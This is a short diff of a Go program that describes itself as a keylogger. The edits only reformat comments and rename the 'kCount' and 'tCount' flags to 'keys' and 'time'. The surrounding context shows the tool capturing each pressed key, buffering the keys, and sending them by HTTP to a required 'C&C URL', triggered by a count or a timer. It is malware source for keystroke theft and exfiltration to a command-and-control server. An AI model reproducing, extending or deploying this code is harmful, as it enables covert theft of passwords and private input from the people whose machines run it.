@@ -115,7 +115,7 @@ func (kl Keylogger) ParseKeycode(keyCode int) Key {
 	return key
 }
 
-//SendKeyLog sends an HTTP request to specified in cmd arguments server
+// SendKeyLog sends an HTTP request to specified in cmd arguments server
 func SendKeyLog(enteredKeys []string, url string) {
 
 	var strToSend string
@@ -160,8 +160,8 @@ func AddHttpKey(url string) string {
 func main() {
 
 	var (
-		keysToSendFlag    = flag.Int("kCount", 5, "Num of keys to store and send at one time[DEFAULT: 1000]")
-		timeUntilSendFlag = flag.Int("tCount", 10, "Minutes until send captured keys [DEFAULT: 10]")
+		keysToSendFlag    = flag.Int("keys", 5, "Num of keys to store and send at one time[DEFAULT: 1000]")
+		timeUntilSendFlag = flag.Int("time", 10, "Minutes until send captured keys [DEFAULT: 10]")
 		url               = flag.String("url", "", "C&C URL [DEFAULT: EMPTY] (Required)")
 	)
 
@@ -197,14 +197,14 @@ func main() {
 		timer = time.AfterFunc(timeUntilSend, timerFunc)
 
 		for {
-			//key is equals last pressed key from a Keylogger struct
+			// key is equals last pressed key from a Keylogger struct
 			key := kl.PressedKey()
 
 			if !key.Empty {
 				enteredKeys = append(enteredKeys, string(key.Rune))
 				fmt.Println(string(key.Rune))
 
-				//if number of entered keys is larger than keysToSendFlag, then SendKeyLog is being called
+				// if number of entered keys is larger than keysToSendFlag, then SendKeyLog is being called
 				if len(enteredKeys) >= *keysToSendFlag {
 					fmt.Println(time.Now(), "Sent by count")
 					SendKeyLog(enteredKeys, *url)
